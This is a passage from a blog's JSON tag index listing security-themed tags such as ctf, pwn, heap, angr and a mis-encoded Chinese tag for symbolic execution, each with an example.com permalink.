f","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"},{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"},{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"angr","slug":"angr","permalink":"http://example.com/tags/angr/"},{"name":"ç¬¦å·æ‰§è¡Œ","slug":"ç¬¦å·æ‰§è¡Œ","permalink":"http://example.com/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"}]}